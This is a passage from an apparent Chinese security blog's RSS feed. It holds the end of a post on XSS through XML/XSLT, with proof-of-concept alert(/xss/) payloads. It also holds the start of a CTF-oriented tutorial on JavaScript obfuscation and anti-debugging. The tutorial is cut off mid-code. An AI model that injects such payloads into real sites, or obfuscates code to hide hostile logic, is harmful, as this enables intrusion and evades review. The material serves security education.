class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;xsl:stylesheet&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;version&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&lt;span class=&#34;attr&#34;&gt;xmlns:xsl&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://www.w3.org/1999/XSL/Transform&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;xsl:template&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;match&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt; &lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;regexp&#34;&gt;/xss/&lt;/span&gt;) &lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;Note&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;To: &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;xsl:value-of&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;select&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;note/to&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;From: &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;xsl:value-of&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;select&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;note/from&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;xsl:template&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;xsl:stylesheet&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;除了间接引用 XSLT，在 XML 文档本身中，也可以通过命名空间指定 XHTML 来执行 JavaScript 代码，示例  &lt;code&gt;xss.xml&lt;/code&gt;  如下:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;note&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;to&lt;/span&gt;&amp;gt;&lt;/span&gt;Alice&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;to&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;from&lt;/span&gt;&amp;gt;&lt;/span&gt;Bob&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;from&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;lt;xh:scriptxmlns:xh=&amp;quot;http://www.w3.org/1999/xhtml&amp;quot;&amp;gt;alert(/xss/)&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;xh:script&lt;/span&gt;&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;note&lt;/span&gt;&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;因为如果在 XML 中使用  &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  标签会被认为是一个普通元素而不会将其子元素当成 JavaScript 执行。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/05/23/adout-JS/</guid>
            <title>adout JS</title>
            <link>http://example.com/2024/05/23/adout-JS/</link>
            <pubDate>Thu, 23 May 2024 10:54:43 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;js混淆与反混淆&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#js混淆与反混淆&#34;&gt;#&lt;/a&gt; JS 混淆与反混淆&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;JavaScript&lt;/code&gt;  混淆 &lt;code&gt;（Obfuscation）&lt;/code&gt; 是指通过一系列技术手段，使 JS 代码变得难以理解和分析，增加代码的复杂性和混淆度，阻碍逆向工程和代码盗用。实际上就是一种保护 JS 代码的手段。&lt;/p&gt;
&lt;p&gt;JS 最早被设计出来就是为了在客户端运行，直接以源码的形式传递给客户端，如果不做处理则完全公开透明，任何人都可以读、分析、复制、盗用，甚至篡改源码与数据，这是网站开发者不愿意看到的。&lt;/p&gt;
&lt;p&gt;JS 混淆也是 CTF 比赛中常见的 Web 题型&lt;/p&gt;
&lt;h2 id=&#34;常见混淆手段&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常见混淆手段&#34;&gt;#&lt;/a&gt; 常见混淆手段&lt;/h2&gt;
&lt;h3 id=&#34;代码压缩&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码压缩&#34;&gt;#&lt;/a&gt; 代码压缩&lt;/h3&gt;
&lt;p&gt;就是将代码中的空格和换行符全部删除让代码变成一坨甚至一行，这种方式甚至会出现在一些代码审计的题中阻碍代码阅读&lt;/p&gt;
&lt;h2 id=&#34;代码混淆&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码混淆&#34;&gt;#&lt;/a&gt; 代码混淆&lt;/h2&gt;
&lt;h3 id=&#34;变量名函数名替换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#变量名函数名替换&#34;&gt;#&lt;/a&gt; 变量名 / 函数名替换&lt;/h3&gt;
&lt;p&gt;将有意义的变量名和函数名替换为随机生成的名称&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;function calculateArea(radius) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;  return Math.PI * radius * radius;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;console.log(calculateArea(5));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;_0x2d8f05&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;_0x4b083b&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Math&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;PI&lt;/span&gt; * _0x4b083b * _0x4b083b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(&lt;span class=&#34;title function_&#34;&gt;_0x2d8f05&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;字符串混淆&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#字符串混淆&#34;&gt;#&lt;/a&gt; 字符串混淆&lt;/h3&gt;
&lt;p&gt;将代码中的字符串替换为十六或八进制、编码或者加密形式，防止代码被轻易读取，或者通过拼接使之不可以通过搜索查找原本字符串&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// let str = &amp;#x27;eval&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; str = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\u0065\u0076\u0061\u006c&amp;#x27;&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//unicode编码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; str = &lt;span class=&#34;number&#34;&gt;14.&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;toString&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;31.&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;toString&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;0xf1&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;toString&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;//利用toStirng()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// console.log(&amp;quot;Hello, world!&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//十六进制&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// let str = &amp;#x27;eval&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; str = &lt;span class=&#34;string&#34;&gt;&amp;#x27;e&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;v&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;l&amp;#x27;&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//拼接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;访问成员变量的方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#访问成员变量的方法&#34;&gt;#&lt;/a&gt; 访问成员变量的方法&lt;/h3&gt;
&lt;p&gt;JavaScript 中可以通过 &lt;code&gt;window.eval()&lt;/code&gt;  访问 windows 对象的 eval 方法，也可以用 &lt;code&gt;window[&#39;eval&#39;]&lt;/code&gt;  来访问&lt;/p&gt;
&lt;h3 id=&#34;利用数组拆分&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用数组拆分&#34;&gt;#&lt;/a&gt; 利用数组拆分&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// console.log(new window.Date().getTime())  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; arr = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;log&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;Date&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;getTime&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;[arr[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]](&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;[arr[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]]()[arr[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]]())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;14.&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;toString&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;31.&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;toString&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;0xf1&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;toString&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;常量改算术表达式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常量改算术表达式&#34;&gt;#&lt;/a&gt; 常量改算术表达式&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// var num = 1234&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; num = &lt;span class=&#34;number&#34;&gt;602216&lt;/span&gt; ^ &lt;span class=&#34;number&#34;&gt;603322&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;还可以进一步改成函数调用表达式&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// var num = 602216 ^ 603322 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; a = &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; (&lt;span class=&#34;params&#34;&gt;s, h&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; s ^ h;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;(&lt;span class=&#34;number&#34;&gt;602216&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;603322&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;像这种方式在 js 中还有很多，（甚至可以套娃？滑稽.jpg&lt;/p&gt;
&lt;h3 id=&#34;反调试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反调试&#34;&gt;#&lt;/a&gt; 反调试&lt;/h3&gt;
&lt;h4 id=&#34;禁止debugger&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#禁止debugger&#34;&gt;#&lt;/a&gt; 禁止 debugger&lt;/h4&gt;
&lt;h4 id=&#34;定时器死循环&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#定时器死循环&#34;&gt;#&lt;/a&gt; 定时器死循环&lt;/h4&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;debug&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;debugger&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;setTimeout&lt;/span&gt;(debug, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;debug&lt;/span&gt;(); &lt;span class=&#34;comment&#34;&gt;//这个可以把debug()的部分注释掉&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; c = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;RegExp&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;c.&lt;span class=&#34;property&#34;&gt;toString&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; (&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;检测到调试&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span 